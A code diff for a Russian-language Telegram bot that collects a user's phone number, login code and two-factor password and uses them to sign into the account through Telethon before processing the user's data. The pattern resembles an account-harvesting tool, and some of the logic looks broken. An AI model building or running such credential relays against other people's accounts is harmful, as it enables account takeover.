@@ -74,14 +74,18 @@ async def send_welcome(message: types.Message):
                     message.from_user.id in allowed_users)
 async def get_phone_number(message: types.Message):
     phone_number = message.text
+    
     user_state[message.from_user.id] = {'phone_number': phone_number, 'attempts': 0}
+    
     try:
         # Создаем новый экземпляр клиента
         client = create_client()
         await client.connect()
+        
         # Разлогиниваемся от предыдущего клиента, если он был авторизован
         if await client.is_user_authorized():
             await client.log_out()
+        
         phone_code_hash = await client.send_code_request(phone_number)
         user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
         await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
@@ -95,23 +99,31 @@ async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    # Создаем новый экземпляр клиента
+
     try:
+        # Создаем новый экземпляр клиента
         client = create_client()
         await client.connect()
-        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
+        
+        # Проверяем, что пин-код состоит из 5 цифр
+        if len(code) != 5 or not code.isdigit():
+            user_state[message.from_user.id]['attempts'] += 1
+            if user_state[message.from_user.id]['attempts'] >= 3:
+                raise ValueError("Превышено количество попыток ввода кода. Пожалуйста, попробуйте позже.")
+            raise ValueError("Пин-код должен состоять из 5 цифр.")
+                
+        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
+        
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
-        await client.log_out()
-        await client.disconnect()
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
         user_state[message.from_user.id]['awaiting_password'] = True
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
-    #finally:
-        #await client.log_out()
-        #await client.disconnect()
+    finally:
+        await client.log_out()
+        await client.disconnect()
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
@@ -120,17 +132,19 @@ async def process_password(message: types.Message):
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
     
     try:
+        # Создаем новый экземпляр клиента
+        client = create_client()
         await client.connect()
-        #await client.sign_in(phone_number=phone_number, code=code, password=password, phone_code_hash=phone_code_hash.phone_code_hash)
+        
         await client.sign_in(password=password)
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
-        #user_state[message.from_user.id]['attempts'] += 1
-        #if user_state[message.from_user.id]['attempts'] >= 3:
-        user_state.pop(message.from_user.id, None)
+        user_state[message.from_user.id]['attempts'] += 1
+        if user_state[message.from_user.id]['attempts'] >= 3:
+            user_state.pop(message.from_user.id, None)
         await client.log_out()
         await client.disconnect()
 
